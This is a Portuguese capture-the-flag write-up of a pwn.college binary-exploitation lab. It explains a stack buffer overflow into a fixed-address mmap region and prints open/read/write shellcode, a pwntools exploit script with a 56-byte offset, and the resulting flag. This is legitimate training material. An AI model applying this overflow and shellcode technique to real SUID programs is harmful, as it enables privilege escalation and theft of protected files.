# pwn.college — Hijacking to (Mapped) Shellcode (easy)
### Intro to Cybersecurity · Orange Belt · Binary Exploitation

> **Autor:** Pedro Tuttman  
> **Plataforma:** [pwn.college](https://pwn.college)  
> **Categoria:** Binary Exploitation — Intro to Cybersecurity (Orange Belt)  
> **Técnicas:** Stack buffer overflow · Return address overwrite · Shellcode injection · SUID privilege abuse · Position-independent shellcode · Direct syscall shellcode

## Descrição do Desafio

Este desafio combina dois conceitos: **shellcode injection** e **buffer overflow com sobrescrita do return address**. O objetivo é redirecionar o fluxo de execução do programa para um shellcode injetado em uma região de memória mapeada, obtendo assim a leitura do `/flag`.

O programa funciona em três etapas:
1. Lê o shellcode do stdin e o armazena em uma região mapeada (`mmap`)
2. Aguarda o usuário pressionar Enter para continuar
3. Lê um input no buffer da stack — que pode ser explorado via buffer overflow para sobrescrever o return address

---

## Análise do Binário

### Proteções com `checksec`

![checksec](figuras/checksec_hijacking-mapped(easy).png)

```
Arch:    amd64-64-little
RELRO:   Full RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     PIE enabled
SHSTK:   Enabled
IBT:     Enabled
Stripped: No
```

Pontos relevantes:

- **No canary found** — sem stack canary, o buffer overflow pode sobrescrever o return address sem ser detectado
- **NX enabled** — a stack não é executável, então o shellcode precisa estar em outra região de memória
- **PIE enabled** — os endereços do binário são randomizados (ASLR), mas isso não impede a exploração nesse desafio pelos motivos explicados abaixo

---

## Análise do Stack Frame

![hijacking](figuras/hijacking-mapped(easy).png)

Ao executar o binário, ele exibe o stack frame da função `challenge()` e fornece informações cruciais:

- **O input buffer começa em `0x7ffe69403a60`** (no meio do stack frame, com variáveis locais acima)
- **O buffer tem apenas 22 bytes**, mas o programa aceita input arbitrariamente longo — buffer overflow clássico
- **O shellcode é mapeado em `0x15870000`** — endereço fixo, não randomizado pelo ASLR
- O canary está desabilitado para esse desafio

Mesmo com PIE ativo, dois fatores tornam a exploração direta:
1. O **endereço do shellcode** (`0x15870000`) é fixo a cada execução — o `mmap` é chamado com endereço determinístico
2. O **offset** entre o início do buffer e o return address é constante — o layout interno do stack frame não muda com PIE

---

## Calculando o Offset até o Return Address

Olhando o stack frame exibido pelo binário:

```
buffer começa em:      rsp+0x0020  (0x7ffe69403a60)
saved frame pointer:   rsp+0x0050  (0x7ffe69403a90)
return address:        rsp+0x0058  (0x7ffe69403a98)
```

O offset do início do buffer até o return address:

```
0x7ffe69403a98 - 0x7ffe69403a60 = 0x38 = 56 bytes
```

Ou seja: 56 bytes de padding + 8 bytes do novo return address.

---

## O Shellcode

![shellcode](figuras/shellcode-hijacking-mapped(easy).png)

Reutilizei o shellcode básico de open/read/write dos desafios anteriores — sem preocupação com null bytes, já que esse desafio não filtra o shellcode:

```asm
.global _start
_start:
.intel_syntax noprefix

    # open("/flag", O_RDONLY) → retorna fd em rax
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    # salva o fd em rdi para o read
    mov rdi, rax

    # read(fd, buf, 0x100) → lê o conteúdo do arquivo
    mov rax, 0
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    # write(stdout, buf, 0x100) → imprime na tela
    mov rax, 1
    mov rdi, 1
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    # exit(0)
    mov rax, 60
    mov rdi, 0
    syscall

flag:
    .string "/flag"
results:
    .space 100
```

Compilação e extração dos bytes brutos:

```bash
gcc -nostdlib -static shellcode1.s -o shellcode-elf
objcopy --dump-section .text=shellcode1-raw shellcode-elf
```

---

## O Payload

![payload](figuras/payload-hijacking-mapped(easy).png)

O exploit foi feito com `pwntools` em Python interativo:

```python
from pwn import *

p = process("/challenge/binary-exploitation-hijack-to-mmap-shellcode-w")

# 1. Envia o shellcode para a região mapeada
with open("shellcode1-raw", "rb") as f:
    sh = f.read()
p.sendline(sh)

# 2. Pressiona Enter para continuar
p.sendline()

# 3. Envia o payload de overflow:
#    56 bytes de padding + endereço fixo do shellcode
p.sendline(b"A" * 56 + p64(0x15870000))
```

O `p64(0x15870000)` converte o endereço em 8 bytes little-endian — o formato que o processador x86-64 espera para o return address na stack.

Ao retornar da função `challenge()`, em vez de voltar para `main`, o processador salta para `0x15870000` onde o shellcode está aguardando.

---

## Resultado

![resultado](figuras/resultado-hijacking-mapped(easy).png)

O return address foi sobrescrito com sucesso:

```
- the saved return address is now pointing to 0x15870000.

Goodbye!
pwn.college{IboZyAd3ogf5s5c4c8teCqW2W0F.dlTMzwCOzYTNxEzW}
```

---

## Resumo do Fluxo de Exploração

```
1. Shellcode injetado → armazenado em 0x15870000 (mmap fixo)
2. Buffer overflow na stack → 56 bytes de padding
3. Return address sobrescrito → 0x15870000
4. challenge() retorna → CPU salta para o shellcode
5. Shellcode executa → open/read/write do /flag com EUID=0
```

---

## Por que o PIE não impediu a exploração?

PIE (Position Independent Executable) randomiza os endereços do **binário** (código, dados, GOT, PLT) a cada execução. Porém:

- O **shellcode** não está no binário — está em uma região alocada via `mmap` com endereço fixo (`0x15870000`). O `mmap` pode ser chamado com `MAP_FIXED` ou com endereço sugerido que se mantém constante
- O **offset interno** do stack frame (distância entre o buffer e o return address) é determinado pelo compilador e nunca muda, independente de onde o binário é carregado na memória

Portanto, mesmo com PIE ativo, tanto o destino do salto (shellcode) quanto a distância a percorrer no overflow (56 bytes) são conhecidos e constantes.

---

**Técnicas:** Stack buffer overflow · Return address overwrite · Shellcode injection · SUID privilege abuse · Position-independent shellcode
